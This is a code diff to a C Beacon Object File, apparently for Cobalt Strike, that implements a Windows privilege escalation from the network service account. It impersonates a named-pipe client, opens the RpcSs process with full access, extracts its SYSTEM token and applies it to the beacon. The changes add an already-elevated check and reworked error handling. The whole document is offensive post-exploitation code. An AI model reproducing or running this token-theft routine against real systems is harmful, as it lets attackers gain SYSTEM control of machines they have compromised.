@@ -44,6 +44,10 @@ void NetworkServiceElevate( IN PCHAR Buffer, IN ULONG Length ) {
 	LPCSTR ServerpStr = NULL;
 	BEACON BeaconArgs = { 0 };
 
+	if( BeaconIsAdmin() ) {
+		BeaconPrintf( CALLBACK_ERROR, "Beacon Is Already Elevated" );
+	};
+
 	BeaconDataParse(&BeaconArgs, Buffer, Length);
 	ServerpStr = BeaconDataExtract(&BeaconArgs, NULL);
 	ClientpStr = BeaconDataExtract(&BeaconArgs, NULL);
@@ -60,38 +64,33 @@ void NetworkServiceElevate( IN PCHAR Buffer, IN ULONG Length ) {
 				if ( (ServicePID = GetServiceProcessId("RpcSs")) != 0 ) 
 				{
 					ServicePtr = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, ServicePID);
-					if ( ServicePtr != NULL ) {
-						ServiceTok = TokenGetSystemTokenFromProcess(ServicePtr);
-						if ( ServiceTok != NULL ) {
-							BeaconPrintf(CALLBACK_OUTPUT, "SUCCESS: FOUND SYSTEM TOKEN\n");
-						} else {
-							BeaconPrintf(CALLBACK_ERROR, "FAILURE: COULD NOT FIND SYSTEM TOKEN\n");
+					if ( ServicePtr != NULL ) 
+					{
+						if ( !(ServiceTok = TokenGetSystemTokenFromProcess(ServicePtr)) ) 
+						{
+							_ERROR("TokenGetSystemTokenFromProcess"); 
 						};
-					};
-				};
+					} else { _ERROR("OpenProcess"); };
+				} else { _ERROR("GetServiceProcessId"); };
+
 				BeaconRevertToken();
-			};
-		};
+			} else { _ERROR("ImpersonateNamedPipeClient"); };
+
+		} else { _ERROR("NamedPipeFile"); };
+
 		NamedPipeFree(ServerPipe);
-	};
+	} else { _ERROR("NamedPipeOpen"); };
 
 	if ( ServiceTok != NULL ) {
-		//
-		// If SeImpersonate() is not available, this will
-		// trigger and a failure will occur. As such, work
-		// on an injection method.
-		//
 		if ( ! BeaconUseToken( ServiceTok ) ) {
-			BeaconPrintf(CALLBACK_ERROR, "FAILURE: FAILED TO IMPERSONATE TOKEN\n");
+			_ERROR("BeaconUseToken");
 		};
 		KERNEL32$CloseHandle( ServiceTok );
 	};
 
-	if ( ServicePtr != NULL ) {
+	if ( ServicePtr != NULL )
 		KERNEL32$CloseHandle( ServicePtr );
-	};
 
-	if ( ClientPipe != NULL || ClientPipe != INVALID_HANDLE_VALUE ) {
+	if ( ClientPipe != NULL || ClientPipe != INVALID_HANDLE_VALUE )
 		KERNEL32$CloseHandle( ClientPipe );
-	};
 };
